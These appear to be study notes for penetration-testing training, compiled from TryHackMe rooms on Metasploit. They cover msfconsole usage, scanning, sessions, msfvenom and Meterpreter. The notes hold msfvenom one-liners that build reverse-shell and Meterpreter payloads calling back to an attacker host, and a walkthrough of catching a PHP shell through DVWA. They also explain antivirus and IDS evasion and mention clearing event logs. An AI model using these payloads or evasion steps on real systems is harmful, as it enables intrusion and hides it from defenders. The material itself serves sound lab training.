Basic Metasploit Commands:

search <keyword> - find a module by keyword
use <name_of_module OR #_assigned_to_module_in_search_results>  - select a module for use
info - receive info about the module you have selected to use
options - see list of options for the module you have selected to use and the values they are currently set at
set <name_of_option_you_want_to_set> <value_you_want_to_set_option_to> - set value of an option (example: set RHOSTS 192.168.100.10)
run - run the module you have selected to use

[hat tip: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300]
------------------------------------------------------------------------------------
Metasploit: Introduction
An introduction to the main components of the Metasploit Framework.
From: https://tryhackme.com/room/metasploitintro [with some edits and rephrasing]

"Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

Metasploit has two main versions:

Metasploit Pro: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
Metasploit Framework: The open-source version that works from the command line...

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.


The main components of the Metasploit Framework can be summarized as follows;

msfconsole: The main command-line interface.
Modules: supporting modules such as exploits, scanners, payloads, etc.
Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it ... using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.

Exploit: A piece of code that uses a vulnerability present on the target system.
Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).
- Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
- Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.
- Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
On the other hand, “evasion” modules will try that, with more or less success.
- Exploits: Exploits, neatly organized by target system.
- NOPs: NOPs (No OPeration) do nothing, literally.
They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
- Payloads: Payloads are codes that will run on the target system.
Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading     a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the       calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.
Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.
You will see three different directories under payloads: singles, stagers and stages.
1) Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
2) Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
3) Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.
generic/shell_reverse_tcp
windows/x64/shell/reverse_tcp
Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.
- Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

If you wish to familiarize yourself further with these modules, you can find them under the modules folder of your Metasploit installation. 

As previously mentioned, the console will be your main interface to the Metasploit Framework. You can launch it using the msfconsole command on ... any system the Metasploit Framework is installed on.

Once launched, you will see the command line changes to msf5 (or msf6 depending on the installed version of Metasploit). The Metasploit console (msfconsole) can be used just like a regular command-line shell, as you can see below.

Note: remember always to check the msfconsole prompt to ensure you are in the right context. When dealing with Metasploit, you may see five different prompts:
1) The regular command prompt: You can not use Metasploit commands here (e.g. root@ip-10-10-XX-XX:~#)
2) The msfconsole prompt: msf5 (or msf6 depending on your installed version) is the msfconsole prompt. As you can see, no context is set here, so context-specific commands [about which we will learn later] to set parameters and run modules can not be used here. This prompt looks like: msf5 >
3)  A context prompt: Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here. Example prompt: msf5 exploit(windows/smb/ms17_010_eternalblue) >
4) The Meterpreter prompt: Meterpreter is an important payload ... This means a Meterpreter agent was loaded to the target system and connected back to you. You can use Meterpreter specific commands here. This prompt looks like: meterpreter >
5) A shell on the target system: Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system. This prompt looks like: C:\Windows\system32> (for a shell on a Windows system)


The first command [to learn] is 'ls' which lists the contents of the folder from which Metasploit was launched using the msfconsole command.

Another command is 'ping' sent to Google's DNS IP address (8.8.8.8). Since, you are using Linux you meed to add the -c 1 option, so only a single ping was sent. Otherwise, the ping process will continue until it is stopped using CTRL+C.

msfconsole will support most Linux commands, including 'clear' (to clear the terminal screen), but will not allow you to use some features of a regular command line (e.g. does not support output redirection) - so you cannot enter a command like: ls > ls.txt

The 'help' command can be used on its own (help) or for a specific command (e.g. help set)

You can use the 'history' command to see commands you have typed earlier.

An important feature of msfconsole is the support of tab completion ... For example, if you start typing he and press the tab key, you will see it auto-completes to help.

Msfconsole is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. For example one might use the ms17_010_eternalblue exploit, and set parameters such as RHOSTS. If one were to then switch to another module (e.g. a port scanner), one would need to set the RHOSTS value again as all changes we have made remained in the context of the ms17_010_eternalblue exploit...

A module can be selected by typing use and the module name (e.g. use exploit/windows/smb/ms17_010_eternalblue)
or
The module to be used can also be selected with the use command followed by the number at the beginning of the search result line.

After choosing a module, the command line prompt will change to reflect that one is now in that module. For example, one might see:
msf6 exploit(windows/smb/ms17_010_eternalblue) >

Typing: 'show options', will print options related to the exploit we have chosen earlier. The show options command will have different outputs depending on the context it is used in. For example the eternalblue exploit will require we set variables like RHOSTS and RPORT. On the other hand, a post-exploitation module may only need us to set a SESSION ID ... A session is an existing connection to the target system that the post-exploitation module will use.
In other words, once you have entered the context of a module using the use command followed by the module name, as seen earlier, you will need to set parameters ... It is good practice to use the 'show options' command to list the required parameters.
All parameters are set using the same command syntax:
set PARAMETER_NAME VALUE
As mentioned the 'show options' command will list all available parameters.
Some of these parameters REQUIRE a value for the exploit to work (there will be a yes in the Required column) - some do not. Some required parameter values will be pre-populated, make sure you check if these should remain the same for your target. For example, a web exploit could have an RPORT (remote port: the port on the target system Metasploit will try to connect to and run the exploit) value preset to 80, but your target web application could be using port 8080. Again, set PARAMETER_NAME VALUE' will set the parameter. Once you have set a parameter, you can use the 'show options' command to check the value was set correctly.
Parameters you will often use are:
RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt.
RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
PAYLOAD: The payload you will use with the exploit.
LHOST: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
You can override any set parameter using the 'set' command again with a different value. You can also clear any parameter value using the 'unset' command or clear all set parameters with the 'unset all' command.
You can use the 'setg' command to set values that will be used for all modules. The 'setg' command is used like the 'set' command. The difference is that if you use the 'set' command to set a value using a module and you switch to another module, you will need to set the value again. The 'setg' command allows you to set the value so it can be used by default across different modules. You can clear any value set with 'setg' using 'unsetg'. So, in other words: The 'setg' command sets a global value that will be used until you exit Metasploit or clear it using the 'unsetg' command.

Using modules
Once all module parameters are set, you can launch the module using the 'exploit' command. Metasploit also supports the 'run' command, which is an alias created for the 'exploit' command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.).
The 'exploit' command can be used without any parameters or using the “-z” parameter.
The 'exploit -z' command will run the exploit and background the session as soon as it opens.
This will return you the context prompt from which you have run the exploit.
Some modules support the 'check' option. This will check if the target system is vulnerable without exploiting it.

Sessions
Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.
You can use the 'background' command to background the session prompt and go back to the msfconsole prompt.
Alternatively, CTRL+Z can be used to background sessions.
The 'sessions' command can be used from the msfconsole prompt or any context to see the existing sessions along with their session numbers.
To interact with any session, you can use the sessions -i command followed by the desired session number.

The 'show' command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules. 
If used from the msfconsole prompt, the 'show' command will list all modules.
The 'use' and 'show' options commands we have seen so far are identical for all modules in Metasploit.
You can leave the context you are in by using the 'back' command.

Further information on any module can be obtained by typing the 'info' command within its context.
Alternatively, you can use the 'info' command followed by the module’s path from the msfconsole prompt (e.g. info exploit/windows/smb/ms17_010_eternalblue). Info is not a help menu; it will display detailed information on the module such as its author, relevant sources, etc.

One of the most useful commands in msfconsole is 'search'. This command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system - e.g. search ms17-010.
The output of the search command provides an overview of each returned module. You may notice the “name” column already gives more information than just the module name. You can see the type of module (auxiliary, exploit, etc.) and the category of the module (scanner, admin, windows, Unix, etc.). You can use any module returned in a search result with the command use followed by the number at the beginning of the result line.

Another essential piece of information returned is in the “rank” column. Exploits are rated based on their reliability. The table below provides their respective descriptions. Link to table: https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

You can direct the search function using keywords such as type and platform.
For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary:
msf6 > search type:auxiliary telnet

Please remember that exploits take advantage of a vulnerability on the target system and may always show unexpected behavior. A low-ranking exploit may work perfectly, and an excellent ranked exploit may not, or worse, crash the target system.

From: https://tryhackme.com/room/metasploitintro [with some editing]
------------------------------------------------------------------------------------
Metasploit: Exploitation
Using Metasploit for scanning, vulnerability assessment and exploitation.
From: https://tryhackme.com/room/metasploitexploitation [with some edits and rephrasing]; Task 2

Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the 'search portscan' command.

Port scanning modules will require you to set a few options. After selecting a module type type: 'show options' (example: msf6 auxiliary(scanner/portscan/tcp) > show options)

Options that need to be set, include:
CONCURRENCY: Number of targets to be scanned simultaneously.
PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
RHOSTS: Target or target network to be scanned.
THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

Note: You can directly perform Nmap scans from the msfconsole prompt (e.g. msf6 > nmap -sS 10.10.12.229)

Some available port scanning modules are:

UDP service Identification
The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol) ... this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services, for example: SMB. Especially useful in a corporate network would be smb_enumshares and smb_version but please spend some time to identify scanners that the Metasploit version installed on your system offers.

When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

Remember, Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system.
---------------------------------------------------------------------------------
The Metasploit Database
From: https://tryhackme.com/room/metasploitexploitation [with some edits and rephrasing]; Task 3

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. 


You will first need to start the PostgreSQL database, which Metasploit will use with the following command: 'systemctl start postgresql'. Then you will need to initialize the Metasploit Database using the 'msfdb init' command. You can then launch msfconsole and check the database status using the db_status command.
[root@kali:~# systemctl start postgresql 
root@kali:~# msfdb init
root@kali:~# msfconsole
msf6 > db_status]

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the 'workspace' command. 

You can add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively. 
The new database name is printed in red, starting with a * symbol.
You can use the 'workspace' command to navigate between workspaces simply by typing 'workspace' followed by the desired workspace name. 
You can use the 'workspace -h' command to list available options for the workspace command. 

Different from regular Metasploit usage, once Metasploit is launched with a database, the help command, you will show the Database Backends Commands menu:
Database Backend Commands
=========================

Command           Description
-------           -----------
analyze           Analyze database information about a specific address or address range
db_connect        Connect to an existing data service
db_disconnect     Disconnect from the current data service
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
db_remove         Remove the saved data service entry
db_save           Save the current data service connection as the default to reconnect on startup
db_status         Show the current data service status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces

If you run a Nmap scan using the 'db_nmap' shown above, all results will be saved to the database. 
You can now reach information relevant to hosts and services running on target systems with the 'hosts' and 'services' commands, respectively. 
The 'hosts -h' and 'services -h' commands can help you become more familiar with available options. 
Once the host information is stored in the database, you can use the 'hosts -R' command to add this value to the RHOSTS parameter. 

Example Workflow
-----------------
1) We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the 'use auxiliary/scanner/smb/smb_ms17_010' command.
2) We set the RHOSTS value using 'hosts -R'.
3) We have typed 'show options' to check if all values were assigned correctly. 
4) Once all parameters are set, we launch the exploit using the 'run' or 'exploit' command. 

If there is more than one host saved to the database, all IP addresses will be used when the hosts -R command is used. 

In a typical penetration testing engagement, we could have the following scenario: 
1) Finding available hosts using the db_nmap command
2) Scanning these for further vulnerabilities or open ports (using a port scanning module) 

The services command used with the -S parameter will allow you to search for specific services in the environment, e.g. msf6 > services -S netbios.
You may want to look for low-hanging fruits such as:
HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
FTP: Could allow anonymous login and provide access to interesting files. 
SMB: Could be vulnerable to SMB exploits like MS17-010
SSH: Could have default or easy to guess credentials
RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 
----------------------------------------------------------------------------------------------------------------------
Vulnerabilities
From: https://tryhackme.com/room/metasploitexploitation [with some edits and rephrasing]; Task 4
Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you. For example, if you identify a VNC service running on the target, you may use the 'search' function on Metasploit to list useful modules. The results will contain payload and post modules. At this stage, these results are not very useful as we have not discovered a potential exploit to use just yet. However, in the case of VNC, there are several scanner modules that we can use to discover if the particular VNC service running on the system is vulnerable to being exploited.
You can use the 'info' command for any module to have a better understanding of its use and purpose.
For example, the auxiliary/scanner/vnc/vnc_login module info has a description that says:
"This module will test a VNC server on a range of machines and report successful logins." - basically, it will allow you to run a list of usernames and passwords against the system to see if any are correct.
-------------------------------------------------------------------------------------------------------------------
Exploitation
From: https://tryhackme.com/room/metasploitexploitation [with some edits and rephrasing]; Task 5

As the name suggests, Metasploit is an exploitation framework. Exploits are the most populated module category.
You can search exploits using the 'search' command, obtain more information about the exploit using the 'info' command, and launch the exploit using 'exploit' or 'run'. While the process itself is simple, remember that a successful outcome depends on a thorough understanding of services running on the target system.

Most of the exploits will have a preset default payload. However, you can always use the 'show payloads' command to show a numbered list of other payloads you can use with that specific exploit.
Once you have decided on the payload, you can use the 'set payload' command to make your choice (e.g. set payload 2).

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

Some payloads will open new parameters that you may need to set, running the 'show options' command once more can show these. For example, a reverse shell payload will at least require you to set the LHOST option.

Working with sessions
---------------------
Once a session is opened, you can background it using CTRL+Z or abort it using CTRL+C. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.
The 'sessions' command will list all active sessions. The sessions command supports a number of options that will help you manage sessions better.
'sessions -h' will list sessions arguments:
msf6 > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C   Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S   Row search filter.
    -c   Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i   Interact with the supplied session ID
    -k   Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n   Name or rename a session by ID
    -q        Quiet mode
    -s   Run a script or module on the session given with -i, or all
    -t   Set a response timeout (default: 15)
    -u   Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6

You can interact with any existing session using the sessions -i command followed by the session ID.
----------------------------------------------------------------------------------------------------------------
Msfvenom
From: https://tryhackme.com/room/metasploitexploitation [with some edits and rephrasing]; Task 6

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

Output formats
You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The 'msfvenom --list formats' command can be used to list supported output formats

Encoders
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem.
The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw:
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64.

Handlers
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
For exammple: we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application)...The exploit steps are:
1) Generate the PHP shell using MSFvenom
2) Start the Metasploit handler
3) Execute the PHP shell

MSFvenom will require: a payload; the local machine IP address; and the local port to which the payload will connect.
Seen below, 10.0.2.19 is the IP address of [the] machine used in the attack and the local port 7777 was chosen:
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

We will use Multi Handler to receive the incoming connection. The module can be used with the 'use exploit/multi/handler' command.
Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values.

Once everything is set, we will 'run' the handler and wait for the incoming connection.

When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.

If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

Other Payloads

Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.

Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/introtoshells ; Task 9 [with some edits and rephrasing]

msfvenom
--------
Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py) ... the following information will be a brief introduction to the concepts that will prove useful ...

The standard syntax for msfvenom is as follows:

msfvenom -p <PAYLOAD> <OPTIONS>

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

Here we are using a payload and four options:
-f <format>
Specifies the output format. In this case that is an executable (exe)
-o <file>
The output location and filename for the generated payload.
LHOST=<IP>
Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
LPORT=<port>
The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

Meterpreter

On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they must be caught in Metasploit.

Payload Naming Conventions

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

<OS>/<arch>/<payload>

For example:

linux/x86/shell_reverse_tcp

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

windows/shell_reverse_tcp

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.

In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:

shell/reverse_tcp

As staged payloads are denoted with another forward slash (/).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

windows/x64/meterpreter/reverse_tcp

A Linux 32bit stageless Meterpreter payload would look like this:

linux/x86/meterpreter_reverse_tcp

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

msfvenom --list payloads

This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads, e.g.:
msfvenom --list payloads | grep "linux/x86/meterpreter"
This gives us a full set of Linux meterpreter payloads for 32bit targets.

------------------------------------------------------------------------------------------------------------------
Metasploit: Meterpreter
------------------------
From: https://tryhackme.com/room/meterpreter [with some edits and rephrasing]; task 1

Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.

Meterpreter has many versions which will provide different functionalities based on the target system.

How does Meterpreter work?

Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.

Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.

While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth ... [even so,] most antivirus software will detect it.

It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.
--------------------------------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/meterpreter [with some edits and rephrasing]; task 2

As discussed in the previous Metasploit rooms:
Introduction to Metasploit: https://www.tryhackme.com/jr/metasploitintro
Scanning and Exploitation with Metasploit: https://www.tryhackme.com/jr/metasploitexploitation
... Metasploit payloads can be initially divided into two categories; inline (also called single) and staged.

As you will remember, staged payloads are sent to the target in two steps. An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size. The inline payloads are sent in a single step. Meterpreter payloads are also divided into stagged and inline versions. However, Meterpreter has a wide range of different versions you can choose from based on your target system. 

The easiest way to have an idea about available Meterpreter versions could be to list them using msfvenom...
[Use the following command:] msfvenom --list payloads | grep meterpreter

The list will show Meterpreter versions available for the following platforms:
Android
Apple iOS
Java
Linux
OSX
PHP
Python
Windows

Your decision on which version of Meterpreter to use will be mostly based on three factors:

1) The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
2) Components available on the target system (Is Python installed? Is this a PHP website? etc.)
3) Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.) 

If you are not using Meterpreter as a standalone payload generated by Msfvenom, [but rather as part of a specific exploit], your choice may also be limited by the exploit. You will notice some exploits will have a default Meterpreter payload, [for] example ... the ms17_010_eternalblue exploit [has the default payload] windows/x64/meterpreter/reverse_tcp. [However remember besides the default payload], [y]ou can also list other available payloads for an exploit module using the 'show payloads' command ...
------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/meterpreter [with some edits and rephrasing]; task 3

Meterpreter Commands
--------------------
Typing 'help' on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.
Every version of Meterpreter will have different command options, so running the 'help' command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.


Meterpreter will provide you with three primary categories of tools:
Built-in commands
Meterpreter tools
Meterpreter scripting

If you run the 'help' command, you will see Meterpreter commands are listed under different categories:
Core commands
File system commands
Networking commands
System commands
User interface commands
Webcam commands
Audio output commands
Elevate commands
Password database commands
Timestomp commands

Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

Core commands
-------------
background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session

File system commands
--------------------
cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory

Networking commands
-------------------
arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table

System commands
---------------
clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
